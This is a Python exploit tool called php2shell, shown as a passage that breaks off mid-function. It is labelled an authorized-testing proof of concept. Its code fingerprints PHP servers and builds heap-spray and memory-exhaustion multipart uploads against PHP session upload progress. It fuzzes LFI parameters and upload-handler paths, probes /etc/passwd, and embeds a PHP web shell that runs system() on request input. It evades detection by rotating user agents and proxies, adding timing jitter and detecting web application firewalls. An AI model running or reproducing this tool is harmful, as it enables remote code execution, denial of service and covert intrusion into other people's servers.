#!/usr/bin/env python3
"""
php2shell — Hybrid PHP upload PoC (authorized testing).

Layer 1: PHP core CVE chain (109618/109619, Auto-LFI discovery, FPM two-step, timing).
Layer 2: Application-level upload handler discovery + shell verification.
"""

from __future__ import annotations

import argparse
import json
import random
import re
import sys
import threading
import time
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import asdict, dataclass, field, replace
from pathlib import Path
from typing import Any, Callable, Optional
from urllib.parse import quote, urljoin, urlparse

import requests
from requests.adapters import HTTPAdapter
from requests.exceptions import (
    ConnectionError as RequestsConnectionError,
    ProxyError,
    SSLError,
    Timeout,
)
from rich.console import Console
from rich.panel import Panel
from rich.progress import BarColumn, MofNCompleteColumn, Progress, TextColumn, TimeElapsedColumn
from rich.table import Table
from urllib3.util.retry import Retry

try:
    from bs4 import BeautifulSoup

    _HAS_BS4 = True
except ImportError:
    BeautifulSoup = None  # type: ignore[misc, assignment]
    _HAS_BS4 = False

CHECK_MARKER = "PHP2SHELL_CHECK_OK"
CORE_MARKER_PREFIX = "PHP2SHELL_CORE_"
PHP_SESSION_UPLOAD_PROGRESS = "PHP_SESSION_UPLOAD_PROGRESS"
CORE_DEFAULT_FILE_FIELD = "f"
CORE_DEFAULT_PADDING = 512
CORE_PROBE_PATHS: tuple[str, ...] = (
    "/",
    "/index.php",
    "/login.php",
    "/wp-login.php",
    "/admin/index.php",
)

PHP_VERSION_RE = re.compile(r"PHP/(\d+)\.(\d+)\.(\d+)", re.I)
CVE_109618 = "CVE-2026-109618"
CVE_109619 = "CVE-2026-109619"

# First fixed patch per minor branch (eness/php2shell-CVE PoC matrix).
PHP_BRANCH_FIRST_FIXED: dict[tuple[int, int], int] = {
    (8, 2): 35,
    (8, 3): 36,
    (8, 4): 27,
    (8, 5): 12,
}

CORE_RESPONSE_SIGNALS = re.compile(
    r"(upload_progress|UPLOAD_PROGRESS|session\.upload_progress|"
    r"Session object destruction failed|Allowed memory size of|"
    r"memory exhausted|zend_mm_heap|zend_alloc|Fatal error|"
    r"fatal_error_backtrace|worker.*crash|SIGSEGV|segfault)",
    re.I,
)
RE_OOM_109618 = re.compile(
    r"(Allowed memory size of \d+ bytes exhausted|"
    r"memory exhausted|Out of memory|zend_mm_heap corrupted|"
    r"zend_alloc.*failed|Cannot allocate memory)",
    re.I,
)
RE_SESSION_109619 = re.compile(
    r"(session\.upload_progress|PHP_SESSION_UPLOAD_PROGRESS|"
    r"upload_progress\.|Session object destruction failed|"
    r"session_module|ps_files|upload_progress\.name)",
    re.I,
)
RE_WORKER_FAULT = re.compile(
    r"(502 Bad Gateway|503 Service Unavailable|"
    r"Connection reset|Empty reply|upstream prematurely closed|"
    r"SIGSEGV|segfault|worker exited)",
    re.I,
)

CORE_ALIGNMENT_STEPS: tuple[int, ...] = (0, 8, 16, 32, 64)
PHP_BRANCH_PADDING: dict[str, tuple[int, ...]] = {
    "8.1": (384, 448, 512),
    "8.2": (448, 512, 576),
    "8.3": (512, 576, 640),
    "8.4": (640, 704, 768),
    "8.5": (768, 832, 896),
}
PHP_BRANCH_BOUNDARY_LEN: dict[str, int] = {
    "8.1": 24,
    "8.2": 26,
    "8.3": 28,
    "8.4": 30,
    "8.5": 32,
}

SESSION_SAVE_PATH_GUESSES: tuple[str, ...] = (
    "/var/lib/php/sessions/sess_{sid}",
    "/var/lib/php/session/sess_{sid}",
    "/tmp/sess_{sid}",
    "/tmp/php_sessions/sess_{sid}",
    "/usr/local/var/php/sessions/sess_{sid}",
    "/opt/homebrew/var/run/php/sessions/sess_{sid}",
    "/run/php/sessions/sess_{sid}",
    "C:\\Windows\\Temp\\sess_{sid}",
)
FPM_SOCKET_GUESSES: tuple[str, ...] = (
    "/run/php/php-fpm.sock",
    "/run/php/php8.5-fpm.sock",
    "/run/php/php8.4-fpm.sock",
    "/run/php/php8.3-fpm.sock",
    "/run/php/php8.2-fpm.sock",
    "/var/run/php-fpm.sock",
    "/usr/local/var/run/php-fpm.sock",
)
LFI_CHAIN_HINTS: tuple[str, ...] = (
    "?file=/proc/self/fd/N",
    "?page=php://filter/convert.base64-encode/resource=",
    "?lang=../../../../var/lib/php/sessions/sess_{sid}",
)
LFI_PARAM_WORDLIST: tuple[str, ...] = (
    "page",
    "file",
    "path",
    "doc",
    "view",
    "action",
    "cat",
    "dir",
    "module",
    "template",
    "include",
    "read",
    "content",
    "lang",
    "open",
    "f",
    "p",
    "load",
    "url",
    "src",
    "document",
    "folder",
    "name",
    "img",
    "filename",
    "filepath",
    "pg",
    "section",
    "theme",
    "style",
    "type",
    "item",
    "id",
)
LFI_AUTO_PROBE_PAGES: tuple[str, ...] = (
    "/",
    "/index.php",
    "/main.php",
    "/home.php",
    "/default.php",
    "/bitrix/urlrewrite.php",
    "/bitrix/admin/index.php",
)
LFI_DISCOVERY_PROBE_FILE = "/etc/passwd"
LFI_DISCOVERY_MIN_SCORE = 4
LFI_DISCOVERY_LOCK_SCORE = 6
DEFAULT_LFI_DISCOVER_MAX_PROBES = 120
RE_LFI_INCLUDE_ERROR = re.compile(
    r"(Failed opening|failed to open stream|No such file or directory|"
    r"include\(\)|include_once|require\(\)|require_once|"
    r"open_basedir restriction in|Permission denied.*\bon line\b|"
    r"Warning:.*include|Fatal error:.*require)",
    re.I,
)
DEFAULT_EXTENSIONS = (".phtml", ".php5", ".php", ".phar")
DEFAULT_TIMEOUT = 30
DEFAULT_THREADS = 20
DEFAULT_EXPLOIT_LOG = "exploit_results.json"
DEFAULT_JITTER_MIN = 0.5
DEFAULT_JITTER_MAX = 2.0
CORE_CHAIN_MARKER = "PHP2SHELL_CHAIN_OK"
LFI_FUZZ_TOKEN = "FUZZ"
DEFAULT_HEAP_SPRAY_FIELDS = 8
DEFAULT_FPM_STAGGER_SEC = 0.12
TIMING_BASELINE_SAMPLES = 4
TIMING_DELTA_MS_FLOOR = 80.0
TIMING_SIGMA_MULT = 2.5
OOM_FUZZ_TIERS_BYTES: tuple[int, ...] = (
    256 * 1024,
    1024 * 1024,
    4 * 1024 * 1024,
    8 * 1024 * 1024,
)
MAX_CORE_MULTIPART_BYTES = 10 * 1024 * 1024
SAPI_MOD_PHP = "mod_php"
SAPI_PHP_FPM = "php-fpm"
SAPI_CGI = "cgi"
SAPI_FRANKENPHP = "frankenphp"
SAPI_UNKNOWN = "unknown"

USER_AGENT_POOL: tuple[str, ...] = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.6; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_7_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
)

WAF_BODY_SIGNATURES = re.compile(
    r"(cloudflare|attention required|access denied|request blocked|"
    r"firewall|sucuri|incapsula|imperva|ddos.?protection|"
    r"bot protection|security service|please enable cookies|"
    r"cf-ray|errors\.edgesuite\.net|blocked by)",
    re.I,
)
DEFAULT_DISCOVERY_LOG = "discovered_endpoints.txt"
DEFAULT_DISCOVERY_PATH_THREADS = 8
DEFAULT_DISCOVERY_PROBE_TIMEOUT = 12.0

# Handler scripts only — no static storage directories (e.g. wp-content/uploads/).
DEFAULT_ENDPOINT_PATHS: tuple[str, ...] = (
    "/upload.php",
    "/uploader.php",
    "/file-upload.php",
    "/fileupload.php",
    "/admin/upload.php",
    "/admin/uploader.php",
    "/tools/upload.php",
    "/api/upload.php",
    "/ajax/upload.php",
    "/includes/upload.php",
    "/modules/upload.php",
    "/wp-admin/async-upload.php",
    "/wp-admin/admin-ajax.php",
    "/wp-admin/media-new.php",
    "/components/com_jprofi/upload.php",
    "/assets/upload.php",
    "/panel/upload.php",
    "/manager/upload.php",
    "/public/upload.php",
    "/cgi-bin/upload.php",
    "/dropzone/upload.php",
    "/plupload/upload.php",
    "/fckeditor/editor/filemanager/connectors/php/upload.php",
    "/ckeditor/upload.php",
    "/tinymce/upload.php",
    "/editor/upload.php",
    "/forum/upload.php",
    "/gallery/upload.php",
    "/photo/upload.php",
    "/avatar/upload.php",
    "/profile/upload.php",
    "/user/upload.php",
    "/member/upload.php",
    "/shop/upload.php",
    "/import/upload.php",
    "/backup/upload.php",
    "/handler.php",
    "/fileupload/index.php",
)

DISCOVERY_CRAWL_PATHS: tuple[str, ...] = (
    "/",
    "/upload.php",
    "/index.php",
    "/admin/",
    "/admin/upload.php",
    "/wp-admin/media-new.php",
    "/wp-login.php",
)

HANDLER_SCRIPT_EXTENSIONS: tuple[str, ...] = (
    ".php",
    ".php5",
    ".phtml",
    ".asp",
    ".aspx",
    ".jsp",
    ".cgi",
)

STATIC_STORAGE_PATH = re.compile(
    r"(^|/)(wp-content/uploads|uploads/files|/uploads/?$|/files/?$|/media/?$|"
    r"/images/?$|/assets/?$|/static/?$|/storage/?$)",
    re.I,
)

UPLOAD_BODY_HINTS = re.compile(
    r"(type\s*=\s*[\"']file[\"']|enctype\s*=\s*[\"']multipart/form-data|"
    r"name\s*=\s*[\"'][^\"']*(upload|file)[^\"']*[\"']|multipart/form-data|"
    r"\b(uploadfile|fileupload|dropzone|plupload)\b)",
    re.I,
)

console = Console(stderr=False)
_io_lock = threading.Lock()


def stage_log(message: str) -> None:
    """Immediate console line (Windows CMD may buffer Rich without this)."""
    with _io_lock:
        console.print(message)
    try:
        sys.stdout.flush()
        sys.stderr.flush()
    except Exception:
        pass


def http_timeout(config: PoCConfig) -> tuple[float, float]:
    """(connect_timeout, read_timeout) to avoid indefinite hangs on dead hosts."""
    read = max(5.0, float(config.timeout))
    return (min(8.0, read), read)


@dataclass
class PoCConfig:
    target_url: str
    proxy: Optional[str] = None
    proxy_list: tuple[str, ...] = ()
    timeout: float = DEFAULT_TIMEOUT
    verify_ssl: bool = True
    upload_field: str = "file"
    extensions: tuple[str, ...] = DEFAULT_EXTENSIONS
    shell_path_hint: Optional[str] = None
    extra_form: dict[str, str] | None = None
    double_ext_bypass: bool = False
    quiet: bool = False
    delay: float = 0.0
    jitter: bool = False
    jitter_min: float = DEFAULT_JITTER_MIN
    jitter_max: float = DEFAULT_JITTER_MAX
    auto_discovery: bool = True
    endpoint_paths: tuple[str, ...] = DEFAULT_ENDPOINT_PATHS
    discovery_path_threads: int = DEFAULT_DISCOVERY_PATH_THREADS
    discovery_probe_timeout: float = DEFAULT_DISCOVERY_PROBE_TIMEOUT
    discovery_log: Optional[str] = None
    check_output: Optional[str] = None
    core_check_enabled: bool = True
    core_file_padding: int = CORE_DEFAULT_PADDING
    core_aggressive_oom: bool = False
    strict_cve: bool = False
    core_adaptive: bool = False
    core_aslr_probe: bool = False
    lfi_url: Optional[str] = None
    core_chain_exploit: bool = False
    core_heap_spray: bool = False
    core_heap_spray_fields: int = DEFAULT_HEAP_SPRAY_FIELDS
    core_fpm_two_step: bool = False
    core_timing_probe: bool = False
    core_fpm_stagger_sec: float = DEFAULT_FPM_STAGGER_SEC
    core_oom_fuzz: bool = True
    core_sapi_auto: bool = True
    core_worker_pin: bool = False
    optimal_oom_bytes: int = 0
    lfi_url_file: Optional[str] = None
    core_endpoint_only: bool = False
    lfi_max_urls: int = 0
    lfi_auto_discover: bool = True
    lfi_discover_max_probes: int = DEFAULT_LFI_DISCOVER_MAX_PROBES


@dataclass
class ShellSession:
    shell_url: str
    param: str = "cmd"


@dataclass
class PhpFingerprint:
    version_raw: str = ""
    major: int = 0
    minor: int = 0
    patch: int = 0
    patch_status: str = "unknown"
    branch_key: str = ""


@dataclass
class CheckResult:
    target_url: str
    vulnerable: bool
    shell_url: Optional[str] = None
    upload_endpoint: Optional[str] = None
    waf_blocked: bool = False
    vector: Optional[str] = None
    core_detail: Optional[str] = None
    cve_ids: Optional[str] = None
    patch_status: Optional[str] = None
    sapi_type: Optional[str] = None
    oom_threshold: Optional[str] = None
    stale_state: Optional[str] = None


@dataclass
class CoreProbeResult:
    vulnerable: bool
    endpoint: str
    sid: str
    signals: list[str] = field(default_factory=list)
    waf_blocked: bool = False
    vector: str = "core-session-upload-progress"
    memory_events: list[str] = field(default_factory=list)
    cve_ids: str = ""
    patch_status: str = "unknown"
    php_version: str = ""
    padding_used: int = CORE_DEFAULT_PADDING
    alignment_used: int = 0
    worker_crash: bool = False
    session_paths: list[str] = field(default_factory=list)
    chain_notes: list[str] = field(default_factory=list)
    latency_ms: float = 0.0
    timing_anomaly: bool = False
    sapi_type: str = SAPI_UNKNOWN
    oom_threshold_bytes: int = 0
    stale_state: str = "unknown"


@dataclass
class SapiProfile:
    sapi: str = SAPI_UNKNOWN
    confidence: float = 0.0
    server_header: str = ""
    powered_by: str = ""
    hints: list[str] = field(default_factory=list)


@dataclass
class CoreChainResult:
    success: bool
    stage: str = ""
    output: Optional[str] = None
    error: Optional[str] = None
    sid: str = ""
    lfi_url_used: Optional[str] = None
    lfi_template_locked: Optional[str] = None
    timing_ms: float = 0.0
    timing_anomaly: bool = False
    notes: list[str] = field(default_factory=list)


@dataclass
class LfiDiscoveryHit:
    template: str
    param: str
    score: int
    signals: list[str] = field(default_factory=list)
    probe_url: str = ""


@dataclass
class ExploitResult:
    target_url: str
    vulnerable: bool
    shell_url: Optional[str] = None
    command: Optional[str] = None
    output: Optional[str] = None
    error: Optional[str] = None
    upload_endpoint: Optional[str] = None
    waf_blocked: bool = False


@dataclass
class UploadHandler:
    url: str
    file_field: str
    method: str = "POST"
    form_fields: dict[str, str] = field(default_factory=dict)
    source: str = "wordlist"
    priority: int = 100
    path: str = ""
    status: int = 0


def build_browser_headers(referer: str) -> dict[str, str]:
    return {
        "User-Agent": random.choice(USER_AGENT_POOL),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Referer": referer,
    }


def pick_proxy(config: PoCConfig) -> Optional[str]:
    if config.proxy_list:
        return random.choice(config.proxy_list)
    return config.proxy


def load_proxy_list(proxy_file: Optional[str], single_proxy: Optional[str]) -> tuple[str, ...]:
    proxies: list[str] = []
    if proxy_file:
        text = Path(proxy_file).read_text(encoding="utf-8", errors="replace")
        for line in text.splitlines():
            raw = line.strip()
            if raw and not raw.startswith("#"):
                proxies.append(raw)
    if single_proxy and single_proxy not in proxies:
        proxies.insert(0, single_proxy)
    return tuple(proxies)


def is_waf_blocked(status_code: int, body: Optional[str]) -> bool:
    if status_code not in (403, 503, 429):
        return False
    text = body or ""
    if WAF_BODY_SIGNATURES.search(text):
        return True
    if status_code == 503 and "cloudflare" in text.lower():
        return True
    return False


def apply_stealth_session(session: requests.Session, config: PoCConfig, url: str) -> None:
    referer = get_origin(url) + "/"
    session.headers.update(build_browser_headers(referer))
    proxy = pick_proxy(config)
    session.proxies.clear()
    if proxy:
        session.proxies.update(normalize_proxies(proxy))


def apply_worker_throttle(config: PoCConfig) -> None:
    if config.jitter:
        low = min(config.jitter_min, config.jitter_max)
        high = max(config.jitter_min, config.jitter_max)
        pause = config.delay + random.uniform(low, high)
        time.sleep(pause)
    elif config.delay > 0:
        time.sleep(config.delay)


def parse_php_version_header(value: str) -> PhpFingerprint:
    fp = PhpFingerprint()
    if not value:
        return fp
    m = PHP_VERSION_RE.search(value)
    if not m:
        return fp
    fp.version_raw = m.group(0)
    fp.major = int(m.group(1))
    fp.minor = int(m.group(2))
    fp.patch = int(m.group(3))
    fp.branch_key = f"{fp.major}.{fp.minor}"
    fp.patch_status = classify_php_patch_status(fp.major, fp.minor, fp.patch)
    return fp


def classify_php_patch_status(major: int, minor: int, patch: int) -> str:
    if major != 8:
        if major < 8:
            return "eol-vulnerable"
        return "unknown"
    fixed = PHP_BRANCH_FIRST_FIXED.get((major, minor))
    if fixed is None:
        if minor <= 1:
            return "eol-vulnerable"
        return "unknown"
    if patch >= fixed:
        return "patched"
    return "vulnerable"


def fetch_php_fingerprint(
    session: requests.Session,
    config: PoCConfig,
    target_url: str,
) -> PhpFingerprint:
    origin = get_origin(target_url)
    candidates = [urljoin(origin, "/"), urljoin(origin, "/index.php")]
    best = PhpFingerprint()
    for url in candidates:
        apply_stealth_session(session, config, url)
        try:
            resp = session.get(
                url,
                timeout=http_timeout(config),
                verify=config.verify_ssl,
                allow_redirects=True,
            )
        except requests.RequestException:
            continue
        powered = resp.headers.get("X-Powered-By") or resp.headers.get("x-powered-by") or ""
        fp = parse_php_version_header(powered)
        if fp.version_raw:
            return fp
        if not best.version_raw and powered:
            best = parse_php_version_header(powered)
    return best


def detect_sapi_profile(
    session: requests.Session,
    config: PoCConfig,
    target_url: str,
    fp: PhpFingerprint,
) -> SapiProfile:
    """Infer PHP SAPI from headers and lightweight error behavior."""
    origin = get_origin(target_url)
    url = urljoin(origin, urlparse(target_url).path or "/")
    apply_stealth_session(session, config, url)
    profile = SapiProfile()
    try:
        resp = session.get(
            url,
            timeout=min(config.timeout, 12.0),
            verify=config.verify_ssl,
            allow_redirects=True,
        )
    except requests.RequestException:
        return profile

    server = (resp.headers.get("Server") or resp.headers.get("server") or "").strip()
    powered = (resp.headers.get("X-Powered-By") or resp.headers.get("x-powered-by") or "").strip()
    via = (resp.headers.get("Via") or "").lower()
    profile.server_header = server
    profile.powered_by = powered

    scores: dict[str, float] = {
        SAPI_MOD_PHP: 0.0,
        SAPI_PHP_FPM: 0.0,
        SAPI_CGI: 0.0,
        SAPI_FRANKENPHP: 0.0,
    }
    server_l = server.lower()
    powered_l = powered.lower()

    if "frankenphp" in server_l or "frankenphp" in powered_l:
        scores[SAPI_FRANKENPHP] += 0.85
        profile.hints.append("FrankenPHP signature in Server/X-Powered-By")
    if "apache" in server_l and ("php/" in powered_l or "mod_php" in powered_l):
        scores[SAPI_MOD_PHP] += 0.75
        profile.hints.append("Apache + PHP X-Powered-By (mod_php likely)")
    if powered_l.startswith("php/") and "apache" in server_l:
        scores[SAPI_MOD_PHP] += 0.35
    if "nginx" in server_l or "openresty" in server_l:
        scores[SAPI_PHP_FPM] += 0.55
        profile.hints.append("nginx front — PHP-FPM backend likely")
    if "php-fpm" in via or "fcgi" in via:
        scores[SAPI_PHP_FPM] += 0.4
    if "cgi" in powered_l or "cgi-fcgi" in powered_l:
        scores[SAPI_CGI] += 0.7
        profile.hints.append("CGI/fastcgi SAPI hint")
    if resp.status_code in (502, 504) and ("nginx" in server_l or "openresty" in server_l):
        scores[SAPI_PHP_FPM] += 0.25

    # Micro fault probe: malformed POST sometimes exposes SAPI-specific errors.
    try:
        fault = session.post(
            url,
            data=b"\x00",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=min(config.timeout, 8.0),
            verify=config.verify_ssl,
        )
        body_l = (fault.text or "").lower()
        if "mod_php" in body_l or "apache handler" in body_l:
            scores[SAPI_MOD_PHP] += 0.5
        if "php-fpm" in body_l or "fastcgi" in body_l:
            scores[SAPI_PHP_FPM] += 0.5
        if "frankenphp" in body_l:
            scores[SAPI_FRANKENPHP] += 0.5
    except requests.RequestException:
        pass

    best = max(scores.items(), key=lambda item: item[1])
    profile.sapi = best[0] if best[1] >= 0.35 else SAPI_UNKNOWN
    profile.confidence = best[1] if best[1] >= 0.35 else 0.0
    if profile.sapi == SAPI_UNKNOWN and fp.version_raw:
        profile.hints.append("SAPI unknown — using hybrid defaults")
    return profile


def apply_sapi_exploit_strategy(config: PoCConfig, profile: SapiProfile) -> PoCConfig:
    """Tune core chain knobs based on detected SAPI (devploit/php2shell matrix)."""
    if not config.core_sapi_auto:
        return config
    if profile.sapi == SAPI_MOD_PHP:
        return replace(
            config,
            core_fpm_two_step=config.core_fpm_two_step,
            core_oom_fuzz=True,
            core_worker_pin=False,
            core_timing_probe=config.core_timing_probe or True,
        )
    if profile.sapi in (SAPI_PHP_FPM, SAPI_FRANKENPHP):
        return replace(
            config,
            core_fpm_two_step=True if config.core_chain_exploit else config.core_fpm_two_step,
            core_oom_fuzz=config.core_oom_fuzz,
            core_worker_pin=True,
            core_timing_probe=config.core_timing_probe or True,
        )
    if profile.sapi == SAPI_CGI:
        return replace(
            config,
            core_oom_fuzz=False,
            core_worker_pin=False,
        )
    return config


def classify_stale_state(
    events: list[str],
    *,
    worker_crash: bool,
    timing_anomaly: bool,
    profile: SapiProfile,
) -> str:
    session_ev = any(e.startswith("session:") for e in events)
    worker_ev = any(e.startswith("worker:") for e in events) or worker_crash
    if session_ev and worker_ev:
        return "likely-uaf"
    if session_ev and profile.sapi in (SAPI_PHP_FPM, SAPI_FRANKENPHP):
        return "likely-stale"
    if timing_anomaly and profile.sapi == SAPI_MOD_PHP:
        return "likely-oom-window"
    if worker_ev:
        return "worker-fault"
    return "none"


def build_multipart_total_size(
    *,
    sid: str,
    filename: str,
    boundary: str,
    total_bytes: int,
    fp: PhpFingerprint,
    spray_count: int,
) -> tuple[bytes, str]:
    """Build multipart near total_bytes using file chunk + heap spray fields."""
    total_bytes = max(CORE_DEFAULT_PADDING, min(total_bytes, MAX_CORE_MULTIPART_BYTES))
    spray = generate_heap_spray_fields(spray_count, fp)
    spray_bytes = sum(len(v) for _, v in spray)
    file_pad = max(512, total_bytes - spray_bytes - 512)
    return build_upload_progress_multipart(
        sid=sid,
        progress_name=PHP_SESSION_UPLOAD_PROGRESS,
        filename=filename,
        boundary=boundary,
        file_padding=file_pad,
        spray_fields=spray,
        max_body_bytes=total_bytes,
    )


def oom_signals_in_result(
    body: str,
    status_code: int,
    events: list[str],
    timing_anomaly: bool,
) -> bool:
    if RE_OOM_109618.search(body) or RE_WORKER_FAULT.search(body):
        return True
    if any(e.startswith("oom:") or e.startswith("worker:") for e in events):
        return True
    return timing_anomaly or status_code in (500, 502, 503)


def run_oom_fuzz_calibration(
    session: requests.Session,
    config: PoCConfig,
    endpoint_url: str,
    fp: PhpFingerprint,
    profile: SapiProfile,
) -> tuple[int, list[str]]:
    """
    Step through 256K -> 1M -> 4M -> 8M bodies; lock size on OOM/heap signals.
    """
    if not config.core_oom_fuzz or profile.sapi == SAPI_CGI:
        return 0, []
    notes: list[str] = []
    optimal = 0
    sid = f"p2s{uuid.uuid4().hex[:16]}"
    token = uuid.uuid4().hex[:8]
    filename = f"{CORE_MARKER_PREFIX}oomfuzz_{token}.bin"

    baseline_mean, baseline_std = (0.0, 0.0)
    if config.core_timing_probe:
        baseline_mean, baseline_std = timing_baseline_stats(session, config, endpoint_url)

    for tier in OOM_FUZZ_TIERS_BYTES:
        boundary = make_multipart_boundary(fp.branch_key)
        body, ct = build_multipart_total_size(
            sid=sid,
            filename=filename,
            boundary=boundary,
            total_bytes=tier,
            fp=fp,
            spray_count=config.core_heap_spray_fields if config.core_heap_spray else 4,
        )
        resp, exc, elapsed = post_core_multipart(
            session,
            config,
            endpoint_url,
            sid=sid,
            boundary=boundary,
            body=body,
            content_type=ct,
        )
        timing_hit = config.core_timing_probe and is_timing_oom_anomaly(
            baseline_mean, baseline_std, elapsed
        )
        if resp is None:
            if exc:
                notes.append(f"oom@{tier}: transport {type(exc).__name__} {elapsed:.0f}ms")
                optimal = tier
                break
            continue
        body_text = resp.text or ""
        events = parse_core_memory_events(body_text, resp.status_code)
        if oom_signals_in_result(body_text, resp.status_code, events, timing_hit):
            optimal = tier
            notes.append(
                f"oom@{tier}: hit signals={','.join(events)} latency={elapsed:.0f}ms"
            )
            if not config.quiet:
                console.print(
                    f"[red bold][OOM-FUZZ][/] threshold ~{tier // 1024}KB "
                    f"({tier} bytes) on {endpoint_url}"
                )
            break
        notes.append(f"oom@{tier}: no hit ({elapsed:.0f}ms)")
    return optimal, notes


def make_multipart_boundary(branch_key: str = "") -> str:
    length = PHP_BRANCH_BOUNDARY_LEN.get(branch_key, 28)
    hex_len = max(8, (length - 12) // 2)
    return f"----Php2Shell{uuid.uuid4().hex[:hex_len]}"


def generate_heap_spray_fields(
    count: int,
    fp: PhpFingerprint,
) -> list[tuple[str, bytes]]:
    """Staggered hidden fields to shape heap layout (109618 spray helper)."""
    count = max(0, min(count, 32))
    branch = fp.branch_key or "8.3"
    size_cycle = PHP_BRANCH_PADDING.get(branch, (512, 576, 640))
    fields: list[tuple[str, bytes]] = []
    for i in range(count):
        base = size_cycle[i % len(size_cycle)]
        chunk = max(32, min(base // max(1, count // 2), 1536))
        fields.append((f"field_{i + 1:02d}", b"H" * chunk))
    return fields


def build_chain_file_body(command: str, pad: int, heap_align: int) -> bytes:
    pad = max(1, min(pad, 8192))
    align = max(0, min(heap_align, pad))
    php = (
        f"<?php /*{CORE_CHAIN_MARKER}*/ "
        f"if(isset($_REQUEST['c'])){{@system($_REQUEST['c']);}} ?>"
    )
    stub = php.encode("utf-8", errors="ignore")
    filler_len = max(0, pad - align - len(stub))
    if align > 0:
        return (b"Z" * filler_len) + stub + (b"A" * min(align, pad))
    return stub + (b"Z" * max(0, pad - len(stub)))


def build_upload_progress_multipart(
    *,
    sid: str,
    progress_name: str,
    filename: str,
    boundary: str,
    file_field: str = CORE_DEFAULT_FILE_FIELD,
    file_padding: int = CORE_DEFAULT_PADDING,
    heap_align: int = 0,
    spray_fields: Optional[list[tuple[str, bytes]]] = None,
    file_body: Optional[bytes] = None,
    progress_value: str = "x",
    max_body_bytes: int = 8192,
) -> tuple[bytes, str]:
    """
    Craft multipart body targeting PHP session.upload_progress (ikow/php2shell-poc style).
    Optional heap spray fields precede the file part.
    """
    if file_body is not None:
        file_chunk = file_body
    else:
        cap = max(8192, min(max_body_bytes, MAX_CORE_MULTIPART_BYTES))
        pad = max(1, min(file_padding, cap))
        align = max(0, min(heap_align, pad))
        if align > 0:
            file_chunk = (b"Z" * (pad - align)) + (b"A" * align)
        else:
            file_chunk = b"Z" * pad

    parts: list[bytes] = [
        f"--{boundary}\r\n".encode(),
        b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n',
        sid.encode(),
        b"\r\n",
        f"--{boundary}\r\n".encode(),
        f'Content-Disposition: form-data; name="{PHP_SESSION_UPLOAD_PROGRESS}"\r\n\r\n'.encode(),
        progress_value.encode("utf-8", errors="replace"),
        b"\r\n",
    ]
    for field_name, field_data in spray_fields or []:
        parts.extend(
            [
                f"--{boundary}\r\n".encode(),
                f'Content-Disposition: form-data; name="{field_name}"\r\n\r\n'.encode(),
                field_data,
                b"\r\n",
            ]
        )
    parts.extend(
        [
            f"--{boundary}\r\n".encode(),
            (
                f'Content-Disposition: form-data; name="{file_field}"; '
                f'filename="{filename}"\r\n\r\n'
            ).encode(),
            file_chunk,
            b"\r\n",
            f"--{boundary}--\r\n".encode(),
        ]
    )
    body = b"".join(parts)
    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


def post_core_multipart(
    session: requests.Session,
    config: PoCConfig,
    endpoint_url: str,
    *,
    sid: str,
    boundary: str,
    body: bytes,
    content_type: str,
) -> tuple[Optional[requests.Response], Optional[BaseException], float]:
    headers = build_browser_headers(get_origin(endpoint_url) + "/")
    headers["Content-Type"] = content_type
    headers["Cookie"] = f"PHPSESSID={sid}"
    proxy = pick_proxy(config)
    if proxy:
        session.proxies.update(normalize_proxies(proxy))
    exc: Optional[BaseException] = None
    resp: Optional[requests.Response] = None
    started = time.perf_counter()
    try:
        resp = session.post(
            endpoint_url,
            data=body,
            headers=headers,
            timeout=http_timeout(config),
            verify=config.verify_ssl,
            allow_redirects=True,
        )
    except (Timeout, SSLError, ProxyError, RequestsConnectionError) as err:
        exc = err
    except requests.RequestException as err:
        exc = err
    elapsed_ms = (time.perf_counter() - started) * 1000.0
    return resp, exc, elapsed_ms


def measure_http_latency_ms(
    session: requests.Session,
    config: PoCConfig,
    url: str,
    *,
    method: str = "GET",
) -> Optional[float]:
    apply_stealth_session(session, config, url)
    started = time.perf_counter()
    try:
        session.request(
            method,
            url,
            timeout=min(config.timeout, 15.0),
            verify=config.verify_ssl,
            allow_redirects=True,
        )
    except requests.RequestException:
        return None
